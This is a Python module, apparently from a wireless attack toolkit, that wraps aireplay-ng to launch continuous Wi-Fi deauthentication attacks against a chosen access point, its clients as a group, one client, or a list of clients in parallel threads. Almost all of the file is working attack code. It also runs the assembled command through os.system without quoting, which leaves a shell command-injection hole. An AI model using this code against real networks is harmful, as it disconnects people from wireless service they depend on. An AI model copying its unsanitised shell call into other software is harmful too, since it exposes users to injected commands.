import subprocess
import shlex
import os
from modules.menu_helper import print_message
from modules.decorator import start_decorator
from threading import Thread
import time
import fcntl
import select

        


class Deauther:
# 
    def __init__(self,interface,target_ap_address,client=None,clients=None):
        self.interface = interface
        self.target_ap_address = target_ap_address
        self.client = client
        self.clients = clients

    @start_decorator 
    def start_broadcast_deauth_attack(self):
        command = self.command_builder()
        launch_command(command)
        # self.delete_old_file()        

    @start_decorator 
    def start_multi_client_deauth_attack(self):
        thread_list = [] 
        print_message(f'Following clients will be disconnected: {self.clients}','yellow',instant=True)
        print_message('Stop attack with Ctrl+C...')
        print_message
        for client in self.clients:
            command = self.command_builder(client)
            t = Thread(target=launch_command,args=(command,))
            t.start()
            thread_list.append(t)

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt as identifier:
            pass

    @start_decorator 
    def start_specific_client_deauth_attack(self):
        command = self.command_builder(client_mac=self.client) 
        launch_command(command)


    def command_builder(self,client_mac=None):
        command = [
            'aireplay-ng',
            self.interface,
            # 'wlan0',
            "--deauth",'0',
            '-x','1',
            "-a",str(self.target_ap_address)
            # "-a",'D4:21:22:77:93:4B'
        ]
        if client_mac:
            command.extend(["-c",str(client_mac)])
        return command

def launch_command(command):
    def workaround(command):
        import os
        mcommand = " ".join(command)
        os.system(mcommand)
    workaround(command)
 


# def delete_old_file(self):
#     #TODO execute without output
#     os.system('rm scan-01.csv')


# def start_deauth_attack(manager):
#     """
#         "1.Deauth all clients",
#         "2.Deauth all clients besides me (if in same network)",
#         "3.Deauth specific client",
#     """
#     interface_name = manager.chosen_interface.interface

#     if manager.attack_type == 2:
#         pass



# def _start_deauth_thread(command):
#     joined = " ".join(command) 
#     process = subprocess.Popen(shlex.split(joined),shell=False,stdout=subprocess.PIPE)
#     # Poll procVess.stdout to show stdout live
#     while True:
#         output = process.stdout.readline()
#         if process.poll() is not None:
#             break
#         print(output.decode('utf-8'))












            # joined_command = " ".join(start_command) 
            # joined_command = 'aireplay-ng  --deauth 0 -a D4:21:22:77:93:4B wlan0'
            # joined_command = 'airodump-ng wlan0mon' 
            # log = open(self.filepath,mode='a')
            # command = shlex.split(joined_command)
            # process = subprocess.Popen(joined_command, shell=True, stdout=subprocess.PIPE, universal_newlines=False)
            # process = subprocess.run('airodump-ng wlan0mon',bufsize=1,shell=True,stdout=subprocess.PIPE)
            # process = subprocess.Popen(shlex.split(joined_command),shell=False,stdout=log)
            # fd = process.stdout.fileno()
            # fl = fcntl.fcntl(fd, fcntl.F_GETFL)
            # fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)

            # while True:
                # output = process.stdout.readline()
                # if output:
                    # print(output.decode('utf-8'))
                    # print(numberOfBytesReceived)
                # time.sleep(0.5)
                # if numberOfBytesReceived <= 0:
                #     raise Exception("No data received!")

            # process = subprocess.run('airodump-ng wlan0mon',bufsize=1,shell=True,stdout=subprocess.PIPE)
            # process = subprocess.Popen(shlex.split(joined_command),shell=False,stdout=log)
            # while True:
            #     with open(self.filepath,'r') as stream:
            #         for line in stream:
            #             print(line)
                
            #     time.sleep(1)
           ## But do not wait till netstat finish, start displaying output immediately ##
            # while True:
            #     # with open(self.filepath,mode='r+') as stream:
            #     #     for line in stream:
            #     #         print(line)
            #     output = process.communicate()
            #     print(output)

            #         # fid.seek(0)
            #         # fid.truncate()
            #     if process.poll() is not None:
            #         return
            #     # print_message(output,'red',instant=True) 
  